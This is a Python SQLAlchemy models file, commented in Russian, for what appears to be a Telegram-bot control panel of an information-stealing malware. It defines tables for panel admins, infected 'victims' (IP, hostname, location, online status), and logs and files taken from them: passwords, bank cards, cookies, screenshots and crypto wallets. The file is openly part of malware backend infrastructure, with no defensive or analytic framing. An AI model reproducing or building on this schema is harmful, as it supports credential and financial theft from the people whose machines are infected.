from sqlalchemy import Column, Integer, String, DateTime, Text, ForeignKey, Boolean, LargeBinary
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import relationship
from datetime import datetime

Base = declarative_base()


class User(Base):
    """Таблица пользователей бота (админы)"""
    __tablename__ = "users"

    id = Column(Integer, primary_key=True)
    telegram_id = Column(Integer, unique=True, nullable=False)
    username = Column(String(255), nullable=True)
    first_name = Column(String(255), nullable=True)
    last_name = Column(String(255), nullable=True)
    is_admin = Column(Boolean, default=False)
    created_at = Column(DateTime, default=datetime.utcnow)
    last_active = Column(DateTime, default=datetime.utcnow)


class Victim(Base):
    """Таблица жертв (зараженные машины)"""
    __tablename__ = "victims"

    id = Column(Integer, primary_key=True)
    victim_id = Column(String(64), unique=True, nullable=False)  # Уникальный ID (хэш или HWID)
    ip_address = Column(String(45), nullable=True)
    hostname = Column(String(255), nullable=True)
    username = Column(String(255), nullable=True)
    os_version = Column(String(255), nullable=True)
    country = Column(String(100), nullable=True)
    city = Column(String(100), nullable=True)
    latitude = Column(String(50), nullable=True)
    longitude = Column(String(50), nullable=True)
    first_seen = Column(DateTime, default=datetime.utcnow)
    last_seen = Column(DateTime, default=datetime.utcnow)
    is_online = Column(Boolean, default=False)
    notes = Column(Text, nullable=True)

    logs = relationship("LogEntry", back_populates="victim")
    files = relationship("FileEntry", back_populates="victim")


class LogEntry(Base):
    """Таблица логов (текстовые данные от стиллера)"""
    __tablename__ = "logs"

    id = Column(Integer, primary_key=True)
    victim_id = Column(Integer, ForeignKey("victims.id"), nullable=False)
    log_type = Column(String(50), nullable=False)  # passwords, cards, cookies, system, etc.
    content = Column(Text, nullable=False)
    created_at = Column(DateTime, default=datetime.utcnow)

    victim = relationship("Victim", back_populates="logs")


class FileEntry(Base):
    """Таблица файлов (бинарные данные от стиллера)"""
    __tablename__ = "files"

    id = Column(Integer, primary_key=True)
    victim_id = Column(Integer, ForeignKey("victims.id"), nullable=False)
    filename = Column(String(255), nullable=False)
    file_path = Column(String(512), nullable=False)  # Путь к сохраненному файлу
    file_size = Column(Integer, nullable=False)
    file_type = Column(String(50), nullable=False)  # screenshot, wallet, document, etc.
    created_at = Column(DateTime, default=datetime.utcnow)

    victim = relationship("Victim", back_populates="files")